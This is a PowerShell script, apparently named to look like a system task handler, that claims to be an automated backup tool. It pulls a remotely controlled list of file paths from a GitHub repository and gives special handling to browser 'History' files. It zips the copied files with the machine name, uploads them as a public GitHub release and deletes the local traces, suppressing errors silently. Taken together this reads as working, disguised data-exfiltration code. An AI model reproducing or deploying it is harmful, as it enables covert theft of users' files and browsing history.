# systemTaskHandler.ps1 - Full automated backup with internal log included

[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

# GitHub parameters
$token = $env:GITHUB_TOKEN
$repo = "drftghy/backup-files"
$now = Get-Date
$timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
$date = $now.ToString("yyyy-MM-dd")
$computerName = $env:COMPUTERNAME
$tag = "backup-$computerName-$timestamp"
$releaseName = "Backup - $computerName - $date"
$tempRoot = "$env:TEMP\upload-$computerName-$timestamp"
$zipName = "upload-$computerName-$timestamp.zip"
$zipPath = Join-Path $env:TEMP $zipName

# Prepare folder
New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null

# Log content buffer
$logLines = @()
$logLines += "[START] $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
$logLines += "ComputerName: $computerName"
$logLines += "Timestamp: $timestamp"
$logLines += "----------------------------------------"

# Get path list from GitHub
$remoteTxtUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
try {
    $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
    $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
} catch {
    $logLines += "[FAIL] ❌ Cannot fetch upload-target.txt from GitHub"
    return
}

# File copy loop with logging
$index = 0
foreach ($path in $pathList) {
    $index++
    $name = "item$index"

    if (-not (Test-Path $path)) {
        $logLines += "[SKIP] $path - ❌ Not found"
        continue
    }

    $dest = Join-Path $tempRoot $name

    try {
        if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
            $srcDir = Split-Path $path
            robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
            $logLines += "[OK] History copied: $path"
        } elseif (Test-Path $path -PathType Container) {
            Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
            $logLines += "[OK] Directory copied: $path"
        } else {
            Copy-Item $path -Destination $dest -Force -ErrorAction Stop
            $logLines += "[OK] File copied: $path"
        }
    } catch {
        $logLines += "[FAIL] $path - $_"
    }
}

# Write internal log to temp folder (included in ZIP)
$logLines += "----------------------------------------"
$logLines += "[END] $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
$logLines -join "`n" | Out-File -FilePath "$tempRoot\upload.log" -Encoding utf8

# Compress archive
try {
    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop
} catch {
    return
}

# Prepare GitHub release
$releaseData = @{
    tag_name = $tag
    name = $releaseName
    body = "Automated file upload from $computerName on $date"
    draft = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "User-Agent" = "PowerShellUploader"
    Accept = "application/vnd.github.v3+json"
}

try {
    $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
    $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
} catch {
    return
}

# Upload ZIP file
try {
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $uploadHeaders = @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent" = "PowerShellUploader"
    }
    $response = Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
} catch {}

# Clean up local temp
Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
